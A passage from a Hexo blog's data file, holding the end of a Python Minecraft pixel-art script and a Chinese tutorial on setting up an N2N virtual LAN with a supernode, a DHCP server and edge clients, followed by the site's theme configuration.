class=\"string\">&quot;2&quot;</span>),  <span class=\"comment\"># magenta 品红色</span></span><br><span class=\"line\">    ((<span class=\"number\">58</span>, <span class=\"number\">179</span>, <span class=\"number\">218</span>), <span class=\"string\">&quot;3&quot;</span>),  <span class=\"comment\"># light_blue 淡蓝色</span></span><br><span class=\"line\">    ((<span class=\"number\">254</span>, <span class=\"number\">216</span>, <span class=\"number\">61</span>), <span class=\"string\">&quot;4&quot;</span>),  <span class=\"comment\"># yellow 黄色</span></span><br><span class=\"line\">    ((<span class=\"number\">128</span>, <span class=\"number\">199</span>, <span class=\"number\">31</span>), <span class=\"string\">&quot;5&quot;</span>),  <span class=\"comment\"># lime 黄绿色</span></span><br><span class=\"line\">    ((<span class=\"number\">243</span>, <span class=\"number\">139</span>, <span class=\"number\">170</span>), <span class=\"string\">&quot;6&quot;</span>),  <span class=\"comment\"># pink 粉红色</span></span><br><span class=\"line\">    ((<span class=\"number\">71</span>, <span class=\"number\">79</span>, <span class=\"number\">82</span>), <span class=\"string\">&quot;7&quot;</span>),  <span class=\"comment\"># gray 灰色</span></span><br><span class=\"line\">    ((<span class=\"number\">157</span>, <span class=\"number\">157</span>, <span class=\"number\">151</span>), <span class=\"string\">&quot;8&quot;</span>),  <span class=\"comment\"># light_gray 淡灰色</span></span><br><span class=\"line\">    ((<span class=\"number\">22</span>, <span class=\"number\">156</span>, <span class=\"number\">156</span>), <span class=\"string\">&quot;9&quot;</span>),  <span class=\"comment\"># cyan 青色</span></span><br><span class=\"line\">    ((<span class=\"number\">137</span>, <span class=\"number\">50</span>, <span class=\"number\">184</span>), <span class=\"string\">&quot;10&quot;</span>),  <span class=\"comment\"># purple 紫色</span></span><br><span class=\"line\">    ((<span class=\"number\">60</span>, <span class=\"number\">68</span>, <span class=\"number\">170</span>), <span class=\"string\">&quot;11&quot;</span>),  <span class=\"comment\"># blue 蓝色</span></span><br><span class=\"line\">    ((<span class=\"number\">131</span>, <span class=\"number\">84</span>, <span class=\"number\">50</span>), <span class=\"string\">&quot;12&quot;</span>),  <span class=\"comment\"># brown 棕色</span></span><br><span class=\"line\">    ((<span class=\"number\">94</span>, <span class=\"number\">124</span>, <span class=\"number\">22</span>), <span class=\"string\">&quot;13&quot;</span>),  <span class=\"comment\"># green 绿色</span></span><br><span class=\"line\">    ((<span class=\"number\">176</span>, <span class=\"number\">46</span>, <span class=\"number\">38</span>), <span class=\"string\">&quot;14&quot;</span>),  <span class=\"comment\"># red 红色</span></span><br><span class=\"line\">    ((<span class=\"number\">29</span>, <span class=\"number\">29</span>, <span class=\"number\">33</span>), <span class=\"string\">&quot;15&quot;</span>),  <span class=\"comment\"># black 黑色</span></span><br><span class=\"line\">    ((<span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>), <span class=\"string\">&quot;15&quot;</span>),  <span class=\"comment\"># black 黑色</span></span><br><span class=\"line\"></span><br><span class=\"line\">))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">to_hsv</span>(<span class=\"params\">color</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> rgb_to_hsv(*[x / <span class=\"number\">255.0</span> <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> color])</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">color_dist</span>(<span class=\"params\">c1, c2</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum((a - b) ** <span class=\"number\">2</span> <span class=\"keyword\">for</span> a, b <span class=\"keyword\">in</span> zip(to_hsv(c1), to_hsv(c2)))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">min_color_diff</span>(<span class=\"params\">color_to_match, colors</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> min((color_dist(color_to_match, test), colors[test]) <span class=\"keyword\">for</span> test <span class=\"keyword\">in</span> colors)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 此函数暂时无用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_player_direction</span>(<span class=\"params\">rotation</span>):</span></span><br><span class=\"line\">    rec = [<span class=\"number\">-90</span>, <span class=\"number\">0</span>, <span class=\"number\">90</span>, <span class=\"number\">180</span>]  <span class=\"comment\"># +x, +z, -x, -z</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> abs(rotation) &lt; <span class=\"number\">45</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;+z&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> abs(rotation) &gt; <span class=\"number\">145</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;-z&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">elif</span> rotation &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;+x&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;-x&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">mc = minecraft.Minecraft.create()</span><br><span class=\"line\">im = Image.open(<span class=\"string\">&#x27;6.jpg&#x27;</span>)</span><br><span class=\"line\">im = im.convert(<span class=\"string\">&#x27;RGB&#x27;</span>)</span><br><span class=\"line\">list = numpy.array(im)</span><br><span class=\"line\">size = list.shape</span><br><span class=\"line\">start = mc.player.getTilePos()</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(size[<span class=\"number\">0</span>]):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(size[<span class=\"number\">1</span>]):</span><br><span class=\"line\">        item = min_color_diff(list[i][j], colors)</span><br><span class=\"line\">        mc.setBlock(start.x + size[<span class=\"number\">0</span>] - i, start.y, start.z + j, <span class=\"number\">251</span>, int(item[<span class=\"number\">1</span>]))</span><br></pre></td></tr></table></figure>\n<p><font color=\"red\">效果如下:</font><br><img data-src=\"https://cdn.file.todest.cn/pic/2019093001.png\" alt=\"皮卡丘\"><br><img data-src=\"https://cdn.file.todest.cn/pic/2019093002.png\" alt=\"晚安\"></p>"},{"title":"N2N构建虚拟局域网","abbrlink":"81bd05cb","date":"2020-05-10T06:02:50.000Z","_content":"# 介绍\nN2N是一款开源的P2P软件，可以用来构建虚拟局域网，也就是说，每个N2N虚拟网络內的用户都可以通过N2N网络访问其他用户主机，即相互ping通。\n\n# 架构\n**Supernode 超级节点：**它在Edge节点间建立握手，或为Edge节点中转数据。能够直通的节点间通讯是P2P的，则由超级节点注册网络路径，超级节点一旦帮助双方完成首次握手，剩余的数据流就会在两个Edge节点间传送，而无需超级节点介入。如果有一方Edge节点的NAT属于对称型（symmetrical），超级节点还需继续为双方提供数据转发服务。\n**Edge 节点：**用户主机上用以与建立N2N网络的软件。几乎每个Edge节点都需建立一个tun/tap虚拟网卡设备，作为接入N2N网络的入口。\n<!--more-->\n\n# 安装\n**地址**\n+ v1: https://github.com/meyerd/n2n/tree/master/n2n_v1\n+ v2: https://github.com/ntop/n2n\n+ v2.1(v2s): https://github.com/meyerd/n2n/tree/master/n2n_v2 非官方版本，与官方的 v2 不兼容\n+ 安卓版本: https://github.com/switch-iot/hin2n (最新版本支持v1、v2、v2s)\n+ 网友编译的主程序：https://github.com/lucktu/n2n\n\n由于v2s版本直连概率比较高，所以本文只介绍v2s版本。同时服务端使用 ubuntu，客户端使用 windows。\n\n**安装方法**\n先从服务端开始，在ubuntu上从github下载源码进行编译安装，由此获得两个可执行文件，supernode和edge。\n```bash\ngit clone https://github.com/meyerd/n2n\ncd n2n/n2n_v2\nmkdir build\ncd build\ncmake ..\nmake\nmake install\n```\n然后服务端运行supernode，服务端防火墙记得开放UDP监听端口，这里假设UDP监听端口为1234。\n```bash\nsupernode -l 1234\n```\n接下来创建DHCP服务器。\n```bash\nsudo apt-get install isc-dhcp-server\n```bash\n\n配置 `/etc/dhcp/dhcpd.conf`，写入以下内容，也可以找到相应位置，取消注释，然后修改内容.\n```bash\nddns-update-style interim;\nignore client-updates;\ndefault-lease-time 604800;\nmax-lease-time 1209600;\n\nsubnet 10.0.0.0 netmask 255.255.255.0 {\n    option subnet-mask 255.255.255.0;\n    range dynamic-bootp 10.0.0.10 10.0.0.100;\n}\n```\n编辑` /etc/default/isc-dhcp-server`，添加一行。假设虚拟网卡名为tun0。\n```bash\nINTERFACES=\"tun0\"\n```\n然后启动DHCP服务，可以使用`dhclient tun0`测试是否从DHCP服务器获取到IP。\n```bash\nservice isc-dhcp-server start\n```\n接下来配置服务端Edge节点，创建DHCP服务器用得着，否则也可以不用配置。\n假设设定的n2n网络IP为10.0.0.1，如果需要可以加上`-k 自定义加密key值`。\n```bash\nedge -d tun0 -a 10.0.0.1 -l 127.0.0.1:1234\n```\n上面步骤会创建名为tun0的虚拟网卡，如果创建失败，可以按照下面方法手动创建。\n```bash\nsudo apt-get install uml-utilities\ntunctl -t tun0\n```\n这样，其他Edge节点启动后就可以由10.0.0.1分配IP地址。\nwindows客户端直接下载编译好的EXE文件，或是自行从github仓库下载源码编译。\n同时，windows需先安装tap-window虚拟网卡软件。\n然后在命令行（管理员模式）运行，注意中文路径及特殊符号路径。\n以下为DHCP获取IP地址的指令。（不知道为什么，我每次DHCP启动或关闭都会断网一瞬间）\n```bash\nedge -r -a dhcp:10.0.0.1 -l 服务端IP:1234\n```\n以下为以指定IP（10.0.0.2）启动，各个Edge节点指定IP启动的IP需各不相同。\n```bash\nedge -a 10.0.0.2 -l 服务端IP:1234\n```","source":"_posts/N2N构建虚拟局域网.md","raw":"---\ntitle: N2N构建虚拟局域网\ncategories:\n  - 计算机网络\ntags:\n  - 虚拟局域网\n  - N2N\nabbrlink: 81bd05cb\ndate: 2020-05-10 14:02:50\n---\n# 介绍\nN2N是一款开源的P2P软件，可以用来构建虚拟局域网，也就是说，每个N2N虚拟网络內的用户都可以通过N2N网络访问其他用户主机，即相互ping通。\n\n# 架构\n**Supernode 超级节点：**它在Edge节点间建立握手，或为Edge节点中转数据。能够直通的节点间通讯是P2P的，则由超级节点注册网络路径，超级节点一旦帮助双方完成首次握手，剩余的数据流就会在两个Edge节点间传送，而无需超级节点介入。如果有一方Edge节点的NAT属于对称型（symmetrical），超级节点还需继续为双方提供数据转发服务。\n**Edge 节点：**用户主机上用以与建立N2N网络的软件。几乎每个Edge节点都需建立一个tun/tap虚拟网卡设备，作为接入N2N网络的入口。\n<!--more-->\n\n# 安装\n**地址**\n+ v1: https://github.com/meyerd/n2n/tree/master/n2n_v1\n+ v2: https://github.com/ntop/n2n\n+ v2.1(v2s): https://github.com/meyerd/n2n/tree/master/n2n_v2 非官方版本，与官方的 v2 不兼容\n+ 安卓版本: https://github.com/switch-iot/hin2n (最新版本支持v1、v2、v2s)\n+ 网友编译的主程序：https://github.com/lucktu/n2n\n\n由于v2s版本直连概率比较高，所以本文只介绍v2s版本。同时服务端使用 ubuntu，客户端使用 windows。\n\n**安装方法**\n先从服务端开始，在ubuntu上从github下载源码进行编译安装，由此获得两个可执行文件，supernode和edge。\n```bash\ngit clone https://github.com/meyerd/n2n\ncd n2n/n2n_v2\nmkdir build\ncd build\ncmake ..\nmake\nmake install\n```\n然后服务端运行supernode，服务端防火墙记得开放UDP监听端口，这里假设UDP监听端口为1234。\n```bash\nsupernode -l 1234\n```\n接下来创建DHCP服务器。\n```bash\nsudo apt-get install isc-dhcp-server\n```bash\n\n配置 `/etc/dhcp/dhcpd.conf`，写入以下内容，也可以找到相应位置，取消注释，然后修改内容.\n```bash\nddns-update-style interim;\nignore client-updates;\ndefault-lease-time 604800;\nmax-lease-time 1209600;\n\nsubnet 10.0.0.0 netmask 255.255.255.0 {\n    option subnet-mask 255.255.255.0;\n    range dynamic-bootp 10.0.0.10 10.0.0.100;\n}\n```\n编辑` /etc/default/isc-dhcp-server`，添加一行。假设虚拟网卡名为tun0。\n```bash\nINTERFACES=\"tun0\"\n```\n然后启动DHCP服务，可以使用`dhclient tun0`测试是否从DHCP服务器获取到IP。\n```bash\nservice isc-dhcp-server start\n```\n接下来配置服务端Edge节点，创建DHCP服务器用得着，否则也可以不用配置。\n假设设定的n2n网络IP为10.0.0.1，如果需要可以加上`-k 自定义加密key值`。\n```bash\nedge -d tun0 -a 10.0.0.1 -l 127.0.0.1:1234\n```\n上面步骤会创建名为tun0的虚拟网卡，如果创建失败，可以按照下面方法手动创建。\n```bash\nsudo apt-get install uml-utilities\ntunctl -t tun0\n```\n这样，其他Edge节点启动后就可以由10.0.0.1分配IP地址。\nwindows客户端直接下载编译好的EXE文件，或是自行从github仓库下载源码编译。\n同时，windows需先安装tap-window虚拟网卡软件。\n然后在命令行（管理员模式）运行，注意中文路径及特殊符号路径。\n以下为DHCP获取IP地址的指令。（不知道为什么，我每次DHCP启动或关闭都会断网一瞬间）\n```bash\nedge -r -a dhcp:10.0.0.1 -l 服务端IP:1234\n```\n以下为以指定IP（10.0.0.2）启动，各个Edge节点指定IP启动的IP需各不相同。\n```bash\nedge -a 10.0.0.2 -l 服务端IP:1234\n```","slug":"N2N构建虚拟局域网","published":1,"updated":"2020-05-11T09:50:02.159Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckieexkb4001kqse56tel9f2a","content":"<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>N2N是一款开源的P2P软件，可以用来构建虚拟局域网，也就是说，每个N2N虚拟网络內的用户都可以通过N2N网络访问其他用户主机，即相互ping通。</p>\n<h1 id=\"架构\"><a href=\"#架构\" class=\"headerlink\" title=\"架构\"></a>架构</h1><p><strong>Supernode 超级节点：</strong>它在Edge节点间建立握手，或为Edge节点中转数据。能够直通的节点间通讯是P2P的，则由超级节点注册网络路径，超级节点一旦帮助双方完成首次握手，剩余的数据流就会在两个Edge节点间传送，而无需超级节点介入。如果有一方Edge节点的NAT属于对称型（symmetrical），超级节点还需继续为双方提供数据转发服务。<br><strong>Edge 节点：</strong>用户主机上用以与建立N2N网络的软件。几乎每个Edge节点都需建立一个tun/tap虚拟网卡设备，作为接入N2N网络的入口。<br><a id=\"more\"></a></p>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><p><strong>地址</strong></p>\n<ul>\n<li>v1: <a href=\"https://github.com/meyerd/n2n/tree/master/n2n_v1\">https://github.com/meyerd/n2n/tree/master/n2n_v1</a></li>\n<li>v2: <a href=\"https://github.com/ntop/n2n\">https://github.com/ntop/n2n</a></li>\n<li>v2.1(v2s): <a href=\"https://github.com/meyerd/n2n/tree/master/n2n_v2\">https://github.com/meyerd/n2n/tree/master/n2n_v2</a> 非官方版本，与官方的 v2 不兼容</li>\n<li>安卓版本: <a href=\"https://github.com/switch-iot/hin2n\">https://github.com/switch-iot/hin2n</a> (最新版本支持v1、v2、v2s)</li>\n<li>网友编译的主程序：<a href=\"https://github.com/lucktu/n2n\">https://github.com/lucktu/n2n</a></li>\n</ul>\n<p>由于v2s版本直连概率比较高，所以本文只介绍v2s版本。同时服务端使用 ubuntu，客户端使用 windows。</p>\n<p><strong>安装方法</strong><br>先从服务端开始，在ubuntu上从github下载源码进行编译安装，由此获得两个可执行文件，supernode和edge。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git <span class=\"built_in\">clone</span> https://github.com/meyerd/n2n</span><br><span class=\"line\"><span class=\"built_in\">cd</span> n2n/n2n_v2</span><br><span class=\"line\">mkdir build</span><br><span class=\"line\"><span class=\"built_in\">cd</span> build</span><br><span class=\"line\">cmake ..</span><br><span class=\"line\">make</span><br><span class=\"line\">make install</span><br></pre></td></tr></table></figure><br>然后服务端运行supernode，服务端防火墙记得开放UDP监听端口，这里假设UDP监听端口为1234。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">supernode -l 1234</span><br></pre></td></tr></table></figure><br>接下来创建DHCP服务器。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install isc-dhcp-server</span><br><span class=\"line\">```bash</span><br><span class=\"line\"></span><br><span class=\"line\">配置 `/etc/dhcp/dhcpd.conf`，写入以下内容，也可以找到相应位置，取消注释，然后修改内容.</span><br><span class=\"line\">```bash</span><br><span class=\"line\">ddns-update-style interim;</span><br><span class=\"line\">ignore client-updates;</span><br><span class=\"line\">default-lease-time 604800;</span><br><span class=\"line\">max-lease-time 1209600;</span><br><span class=\"line\"></span><br><span class=\"line\">subnet 10.0.0.0 netmask 255.255.255.0 &#123;</span><br><span class=\"line\">    option subnet-mask 255.255.255.0;</span><br><span class=\"line\">    range dynamic-bootp 10.0.0.10 10.0.0.100;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure><br>编辑<code>/etc/default/isc-dhcp-server</code>，添加一行。假设虚拟网卡名为tun0。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INTERFACES=<span class=\"string\">&quot;tun0&quot;</span></span><br></pre></td></tr></table></figure><br>然后启动DHCP服务，可以使用<code>dhclient tun0</code>测试是否从DHCP服务器获取到IP。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">service isc-dhcp-server start</span><br></pre></td></tr></table></figure><br>接下来配置服务端Edge节点，创建DHCP服务器用得着，否则也可以不用配置。<br>假设设定的n2n网络IP为10.0.0.1，如果需要可以加上<code>-k 自定义加密key值</code>。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edge -d tun0 -a 10.0.0.1 -l 127.0.0.1:1234</span><br></pre></td></tr></table></figure><br>上面步骤会创建名为tun0的虚拟网卡，如果创建失败，可以按照下面方法手动创建。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install uml-utilities</span><br><span class=\"line\">tunctl -t tun0</span><br></pre></td></tr></table></figure><br>这样，其他Edge节点启动后就可以由10.0.0.1分配IP地址。<br>windows客户端直接下载编译好的EXE文件，或是自行从github仓库下载源码编译。<br>同时，windows需先安装tap-window虚拟网卡软件。<br>然后在命令行（管理员模式）运行，注意中文路径及特殊符号路径。<br>以下为DHCP获取IP地址的指令。（不知道为什么，我每次DHCP启动或关闭都会断网一瞬间）<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edge -r -a dhcp:10.0.0.1 -l 服务端IP:1234</span><br></pre></td></tr></table></figure><br>以下为以指定IP（10.0.0.2）启动，各个Edge节点指定IP启动的IP需各不相同。<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">edge -a 10.0.0.2 -l 服务端IP:1234</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{"sidebar":"<script src=\"//v1.hitokoto.cn/?encode=js&select=%23hitokoto\" defer></script>\n<style>\n@media all and (orientation : portrait) {\n\t#hitokoto{\n\t\tpadding-left: 50px;\n\t\tpadding-right: 50px;\n\t}\n}\n</style>\n\n\n\n\n\n\n\n\n","next":{"override":false,"reminder":false,"cache":{"enable":true},"minify":true,"custom_file_path":{"sidebar":"source/_data/sidebar.swig"},"favicon":{"small":"//cdn.file.todest.cn/blog/user/logo.ico","medium":"//cdn.file.todest.cn/blog/user/logo.ico","apple_touch_icon":"//cdn.file.todest.cn/blog/user/logo.ico","safari_pinned_tab":"//cdn.file.todest.cn/blog/user/logo.ico","ms_browserconfig":"//cdn.file.todest.cn/blog/user/logo.ico"},"rss":null,"footer":{"icon":{"name":"user","animated":false,"color":"#808080"},"copyright":null,"powered":{"enable":true,"version":true},"theme":{"enable":true,"version":true},"beian":{"enable":false,"icp":null,"gongan_id":null,"gongan_num":null,"gongan_icon_url":null}},"creative_commons":{"license":"by-nc-sa","sidebar":false,"post":false,"language":null},"scheme":"Gemini","menu":{"home":"/ || home","about":"/about/ || user","tags":"/tags/ || tags","categories":"/categories/ || th","archives":"/archives/ || archive","相册":"/photo/ || photo","链接":"/links/ || link","留言":"/bbs/ || comments"},"menu_settings":{"icons":true,"badges":true},"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"avatar":{"url":"https://s.gravatar.com/avatar/4756cb352ec7f58884fdc0c219ea00dc?s=80","rounded":false,"rotated":false},"site_state":true,"social":{"GitHub":"https://github.com/todest || github","E-Mail":"mailto:todest@qq.com || envelope","QQ":"http://wpa.qq.com/msgrd?v=3&uin=1123792492 || qq","Facebook":"https://www.facebook.com/ultrasurreal || facebook","StackOverflow":"https://stackoverflow.com/users/11422695 || stack-overflow","Instagram":"https://www.instagram.com/yonghangguo/ || instagram"},"social_icons":{"enable":true,"icons_only":true,"transition":true},"links_settings":{"icon":"link","title":"Links","layout":"inline"},"links":{"BoilTask":"https://boiltask.com","Codancer":"https://www.cnblogs.com/codancer","Colsrch":"https://colsrch.cn","执念":"https://blog.wzy1999.wang","Des_tiny":"https://anyway521.github.io","Drew":"https://cndrew.cn","rookie6":"https://rookie6.github.io","LuoZui":"https://www.lzphi.cn","Sky":"https://angelni.github.io","一Wa哇一天":"https://blogzhy.cn","Jinqimu":"https://jinqimu.xyz","FuZhiyuan":"https://fuzhiyuan.github.io","RuiRui":"https://pipakacha.com"},"toc":{"enable":true,"number":true,"wrap":false,"expand_all":false,"max_depth":6},"chat":{"enable":false,"icon":"comment","text":"Chat"},"excerpt_description":true,"auto_excerpt":{"enable":false,"length":150},"read_more_btn":true,"post_meta":{"item_text":true,"created_at":true,"updated_at":{"enable":true,"another_day":true},"categories":true},"symbols_count_time":{"separated_meta":true,"item_text_post":true,"item_text_total":false,"awl":4,"wpm":275},"tag_icon":false,"reward_settings":{"enable":true,"animation":true,"comment":"赏点呗！"},"reward":{"wechatpay":"//cdn.file.todest.cn/blog/user/wechatpay.jpg","alipay":"//cdn.file.todest.cn/blog/user/alipay.jpg","bitcoin":"//cdn.file.todest.cn/blog/user/bitcoin.png"},"related_posts":{"enable":false,"title":null,"display_in_home":false,"params":{"maxCount":5}},"post_edit":{"enable":false,"url":"https://github.com/user-name/repo-name/tree/branch-name/subdirectory-name"},"cheers":true,"tagcloud":{"min":12,"max":30,"start":"#ccc","end":"#111","amount":200},"calendar":{"calendar_id":"<required>","api_key":"<required>","orderBy":"startTime","offsetMax":24,"offsetMin":4,"showDeleted":false,"singleEvents":true,"maxResults":250},"text_align":{"desktop":"justify","mobile":"justify"},"mobile_layout_economy":false,"android_chrome_color":"#222","safari_rainbow":false,"custom_logo":null,"codeblock":{"highlight_theme":"normal","copy_button":{"enable":true,"show_result":true,"style":null}},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"reading_progress":{"enable":false,"position":"top","color":"#37c6c0","height":"3px"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"github_banner":{"enable":true,"permalink":"https://github.com/yourname","title":"Follow me on GitHub"},"font":{"enable":false,"host":null,"global":{"external":true,"family":"Lato","size":null},"title":{"external":true,"family":null,"size":null},"headings":{"external":true,"family":null,"size":null},"posts":{"external":true,"family":null},"codes":{"external":true,"family":null}},"disable_baidu_transformation":false,"canonical":true,"seo":true,"index_with_subtitle":false,"exturl":false,"google_site_verification":null,"bing_site_verification":null,"yandex_site_verification":null,"baidu_site_verification":null,"baidu_push":false,"math":{"per_page":false,"mathjax":{"enable":true,"mhchem":false},"katex":{"enable":false,"copy_tex":false}},"pjax":false,"fancybox":true,"mediumzoom":false,"lazyload":true,"pangu":false,"quicklink":{"enable":false,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"ignores":null},"comments":{"style":"tabs","active":null,"storage":true,"nav":null},"disqus":{"enable":false,"shortname":null,"count":true,"lazyload":false},"disqusjs":{"enable":false,"api":null,"apikey":null,"shortname":null},"changyan":{"enable":false,"appid":null,"appkey":null},"valine":{"enable":true,"appid":"NNOFYEbCjmMJUqInK2zEpetd-gzGzoHsz","appkey":"Q474k3XvUzlPbRG5bOyNCxVt","notify":false,"verify":false,"placeholder":"写点什么？","avatar":"mm","guest_info":"nick,mail,link","pageSize":10,"language":null,"visitor":false,"comment_count":true,"recordIP":false,"serverURLs":null},"livere_uid":null,"gitalk":{"enable":false,"github_id":null,"repo":null,"client_id":null,"client_secret":null,"admin_user":null,"distraction_free_mode":true,"language":null},"rating":{"enable":false,"id":null,"color":"fc6423"},"add_this_id":null,"google_analytics":{"tracking_id":null,"localhost_ignored":true,"only_pageview":false},"baidu_analytics":null,"growingio_analytics":null,"cnzz_siteid":null,"tencent_analytics":null,"tencent_mta":null,"leancloud_visitors":{"enable":false,"app_id":null,"app_key":null,"security":true,"betterPerformance":false},"firestore":{"enable":false,"collection":"articles","apiKey":null,"projectId":null},"busuanzi_count":{"enable":true,"total_visitors":true,"total_visitors_icon":"user","total_views":true,"total_views_icon":"eye","post_views":true,"post_views_icon":"eye"},"algolia_search":{"enable":false,"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"local_search":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"swiftype_key":null,"chatra":{"enable":false,"async":true,"id":null},"tidio":{"enable":false,"key":null},"note":{"style":"simple","icons":false,"border_radius":3,"light_bg_offset":0},"tabs":{"transition":{"tabs":false,"labels":true},"border_radius":0},"pdf":{"enable":false,"height":"500px"},"mermaid":{"enable":false,"theme":"forest"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"pace":{"enable":false,"theme":"minimal"},"three":{"enable":false,"three_waves":false,"canvas_lines":false,"canvas_sphere":false},"canvas_nest":{"enable":false,"onmobile":true,"color":"0,0,255","opacity":0.5,"zIndex":-1,"count":99},"canvas_ribbon":{"enable":false,"size":300,"alpha":0.6,"zIndex":-1},"vendors":{"_internal":"lib","anime":null,"fontawesome":null,"mathjax":null,"mhchem":null,"katex":null,"copy_tex_js":null,"copy_tex_css":null,"pjax":null,"jquery":null,"fancybox":null,"fancybox_css":null,"mediumzoom":null,"lazyload":null,"pangu":null,"quicklink":null,"disqusjs_js":null,"disqusjs_css":null,"valine":null,"gitalk_js":null,"gitalk_css":null,"algolia_instant_js":null,"algolia_instant_css":null,"pdfobject":null,"mermaid":null,"velocity":null,"velocity_ui":null,"pace":null,"pace_css":null,"three":null,"three_waves":null,"canvas_lines":null,"canvas_sphere":null,"canvas_nest":null,"canvas_nest_nomobile":null,"canvas_ribbon":null},"css":"css","js":"js","images":"images","crash_cheat":true,"clicklove":true,"snow":false}}},"length":1834,"excerpt":"<h1 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h1><p>N2N是一款开源的P2P软件，可以用来构建虚拟局域网，也就是说，每个N2N虚拟网络內的用户都可以通过N2N网络访问其他用户主机，即相互ping通。</p>\n<h1 id=\"架构\"><a href=\"#架构\" class=\"headerlink\" title=\"架构\"></a>架构</h1><p><strong>Supernode 超级节点：</strong>它在Edge节点间建立握手，或为Edge节点中转数据。能够直通的节点间通讯是P2P的，则由超级节点注册网络路径，超级节点一旦帮助双方完成首次握手，剩余的数据流就会在两个Edge节点间传送，而无需超级节点介入。如果有一方Edge节点的NAT属于对称型（symmetrical），超级节点还需继续为双方提供数据转发服务。<br><strong>Edge 节点：</strong>用户主机上用以与建立N2N网络的软件。几乎每个Edge节点都需建立一个tun/tap虚拟网卡设备，作为接入N2N网络的入口。<br>","more":"</p>\n<h1 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h1><p><strong>地址</strong></p>\n<ul>\n<li>v1: <a href=\"https://github.com/meyerd/n2n/tree/master/n2n_v1\">https://github.com/meyerd/n2n/tree/master/n2n_v1</a></li>\n<li>v2: <a href=\"https://github.com/ntop/n2n\">https://github.com/ntop/n2n</a></li>\n<li>v2.1(v2s): <a href=\"https://github.com/meyerd/n2n/tree/master/n2n_v2\">https://github.com/meyerd/n2n/tree/master/n2n_v2</a> 非官方版本，与官方的 v2 不兼容</li>\n<li>安卓版本: <a href=\"https://github.com/switch-iot/hin2n\">https://github.com/switch-iot/hin2n</a> 